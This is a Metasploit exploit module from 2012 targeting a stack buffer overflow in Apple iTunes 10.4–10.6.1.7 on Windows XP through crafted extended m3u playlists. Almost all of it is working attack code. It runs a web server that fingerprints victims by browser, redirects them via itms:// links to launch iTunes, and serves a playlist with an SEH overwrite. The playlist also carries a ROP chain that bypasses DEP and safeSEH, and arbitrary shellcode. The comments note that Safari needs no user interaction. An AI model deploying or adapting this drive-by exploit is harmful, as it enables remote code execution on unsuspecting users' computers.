##
#
# ============================================================================================
# * Apple iTunes <= 10.6.1.7 Extended m3u Stack Buffer Overflow Remote Code Execution (2012) *
# ============================================================================================
#
# Date: Jun 20 2012
# Author: Rh0
# Affected Versions: Apple iTunes 10.4.0.80 to 10.6.1.7
# Tested on: Windows XP Professional SP3 EN
#
# http://pastehtml.com/raw/c25uhk4ab.html
#
# ============================================================================================
# 
# This seems not to be CVE-2012-0677 as this here is stack based. However it was also fixed
# by Apple without mentioning it in the security fixes http://support.apple.com/kb/HT5318
# of iTunes 10.6.3.25
#
#
# - written for educational purposes -
#
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking

    include Msf::Exploit::Remote::HttpServer::HTML

    # e.g.: put this module into modules/exploit/windows/browser/itunes_extm3u_bof.rb

    def initialize(info = {})
        super(update_info(info,
            'Name'  => 'iTunes Extended M3U Stack Buffer Overflow',
            'Description'   => %q{
                This module exploits a stack buffer overflow in iTunes 10.4.0.80 to 10.6.1.7. 
                When opening an extended .m3u file containing an "#EXTINF:" tag description,
                iTunes will copy the content after "#EXTINF:" without appropriate checking
                from a heap buffer to a stack buffer and write beyond the stack buffers boundary.
                This allows arbitrary code execution.
                The Windows XP target has to have QuickTime 7.7.2 installed for this module 
                to work. It uses a ROP chain from a non safeSEH enabled DLL to bypass DEP and
                safeSEH. The stack cookie check is bypassed by triggering a SEH exception.
            },

            ## NOTE ##
            # Exploit works best if iTunes is not running and the user browses to a malicious page.
            # But even if iTunes is already running and playing music, the exploit worked reliably
            #
            # remote code execution is possible via itms:// handler, which instructs a browser to open
            # iTunes:
            # Safari does not prompt for iTunes itms links -> RCE without user interaction
            # Firefox, Opera, and IE ask the user for permission to launch iTunes
            # Chrome asks for permission and spits a big warning

            'Author'            =>
                [
                    'Rh0 <rh0 [at] z1p.biz>'  # discovery and metasploit module 
                ],
            'Version'           => '0.0',
            'DefaultOptions'    =>
                {
                    'EXITFUNC'  => 'process',
                    'InitialAutoRunScript' => 'migrate -f'
                },

            'Platform'          => ['win'],
            'Payload'           =>
                {
                    'Space'     => 1000,
                    'BadChars'  => "\x00\x0a\x0d",
                    'DisableNops'   => true,
                    'PrependEncoder'    => "\x81\xc4\xfc\xfb\xff\xff"   # ADD ESP, -0x404 
                },
            'Targets'           =>
                [
                    ['iTunes 10.4.0.80 to 10.6.1.7 with QuickTime 7.7.2 - Windows XP SP3 EN Professional',
                        {
                            'Platform'  => 'win',
                            'Arch'      => ARCH_X86,
                            'SEH'       => 0x6693afab,  # ADD ESP,0xD40 / ret [QuickTime.qts v7.7.2]
                            'ROP_NOP'   => 0x66801044   # RET
                        }
                    ]
                ],
            'DefaultTarget'     => 0
        ))

        register_options(
            [
                OptPort.new('SRVPORT', [true, "The local port to listen on", 80]),
                OptString.new('URIPATH', [false, "The URI to use for this exploit", "/"]),
            ], 
            self.class
        )
    end

    def on_request_uri(cli,request)

        # re-generate the payload
        return if ((p = regenerate_payload(cli).encoded) == nil)

        host = request.headers['HOST']
        agent = request.headers['USER-AGENT']

        # iTunes browser link
        m3u_location = "itms://#{host}/#{rand_text_alphanumeric(8+rand(8))}.m3u"


        if request.uri =~ /\.ico$/i
            # Discard requests for ico files
            send_not_found(cli)
        #elsif agent =~ /iTunes\/10.6.1/ and agent =~ /Windows XP Professional Service Pack 3/ and request.uri =~ /\.m3u$/i
        elsif agent =~ /iTunes/ and agent =~ /Windows XP Professional Service Pack 3/ and request.uri =~ /\.m3u$/i
            # exploit iTunes (<= 10.6.1.7) on Windows XP SP3 
            send_response(cli, generate_m3u(p), { 'Content-Type' => 'audio/x-mpegurl' })
            status(request,cli,"Sending playlist")
        elsif agent =~ /MSIE (6|7|8)\.0/ and agent =~ /NT 5\.1/
            # redirect MSIE to iTunes link
            send_response(cli, generate_redirect_ie(m3u_location), { 'Content-Type' => 'text/html' })
            status(request,cli,"Redirecting to playlist")
        elsif agent =~ /NT 5\.1/
            # redirect Firefox, Chrome, Opera, Safari to iTunes link
            send_redirect(cli, m3u_location)
            status(request,cli,"Redirecting to playlist")
        else
            send_not_found(cli)
            print_status("Unknown User-Agent. Sending 404")
        end

    end

    # IE did not proper redirect when retrieving an itms:// location redirect via a HTTP header...
    # ... so use html

    def generate_redirect_ie(m3u_location)

        ie_redir = <<-HTML_REDIR
            <!DOCTYPE HTML>
            <html>
            <head>
            <meta http-equiv="refresh" content="0; URL=#{m3u_location}">
            </head>
            </html>
        HTML_REDIR

        return ie_redir

    end

    # create the malicious playlist

    def generate_m3u(payload)

        # Bypass stack cookies by triggering a SEH exception before
        # the cookie gets checked. SafeSEH is bypassed by using a non
        # safeSEH DLL [QuickTime.qts v7.7.2]. DEP is bypassed by using ROP.

        # stack buffer overflow ->
        # overwrite SEH handler ->
        # trigger SEH exception -> 
        # rewind stack (ADD ESP, ...) and land in ROP NOP sled  ->
        # virtualprotect and execute shellcode

        target = targets[0]

        m3u = '#EXTINF:,'

        # stack layout depends on what iTunes is doing (running or not, playing music etc.) ...
        # ... so ensure we overwrite a SEH handler to get back to our rop chain
        m3u << [target['SEH']].pack("V") * 0x6a       # stack pivot/rewind
        m3u << [target['ROP_NOP']].pack("V") * 30     # ROP NOP sled
        m3u << gimme_rop
        m3u << payload

        # 0x1000 should be enough to overflow the stack and trigger SEH
        m3u << rand_text_alphanumeric(0x1000 - m3u.length)

        return m3u

    end

    def gimme_rop()
        
        # thanx to mona.py :)
        rop_chain = [
            0x66c9a6c0,                     # POPAD / RET
            # registers
            0x66801044,                     # EDI: RET 
            0x7c801ad4,                     # ESI: VirtualProtect [kernel32.dll]
            0x6697aa03,                     # EBP: JMP ESP
            junk,                           # skipped
            0x6c1703e8,                     # EBX: will become 0x3e8 after adding 0x93e90000 (dwSize)
            0xffffffd6,                     # EDX: will become 0x40 after adding 0x6a (flNewProtect)
            0x673650b0,                     # ECX: lpflOldProtect
            0x90909090,                     # EAX: nops
            # correct dwSize and flNewProtect
            0x66b7de1b,                     # ADD EBX, 0x93E90000 / RET
            0x66975c56,                     # ADD EDX, 0x6A / RET
            # throw it on the stack
            0x6684b5c6                      # PUSHAD / RET
        ].pack("V*")

        return rop_chain

    end

    def junk
        return rand_text_alpha(4).unpack("L")[0].to_i
    end

    def status(req,cli,action)
        print_status("Request for #{req.uri} from #{cli.peerhost}:#{cli.peerport}. #{action}")
    end


end
